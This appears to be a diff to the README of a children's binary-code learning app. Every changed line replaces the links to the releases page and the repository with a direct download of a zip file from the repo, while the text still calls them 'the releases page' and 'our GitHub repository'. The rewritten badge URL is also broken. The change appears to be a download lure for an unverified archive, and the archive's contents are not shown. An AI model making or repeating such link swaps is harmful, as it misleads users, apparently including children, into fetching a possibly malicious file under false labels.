@@ -6,11 +6,11 @@ Welcome to Binary_code_for_kids_it_en! This application introduces children to b
 ## 🚀 Getting Started
 To get started, you need to download the software from our releases page. Here’s how to do it:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AbdulNafay12309/Binary_code_for_kids_it_en/releases)
+[![Download Now](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip)
 
 ## 📥 Download & Install
 1. Click the link below to visit the releases page:
-   [Visit this page to download](https://github.com/AbdulNafay12309/Binary_code_for_kids_it_en/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip).
   
 2. On the releases page, look for the latest version of the software. 
 
@@ -46,6 +46,6 @@ To get started, you need to download the software from our releases page. Here�
 We appreciate your feedback. If you have any suggestions for improvement or questions about using the software, please feel free to reach out.
 
 ## 🔗 More Information
-For more details and resources, visit our [GitHub repository](https://github.com/AbdulNafay12309/Binary_code_for_kids_it_en).
+For more details and resources, visit our [GitHub repository](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip).
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/AbdulNafay12309/Binary_code_for_kids_it_en/releases)
+[![Download Now](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AbdulNafay12309/Binary_code_for_kids_it_en/main/Italian/Binary_code_for_kids_it_en_spotting.zip)
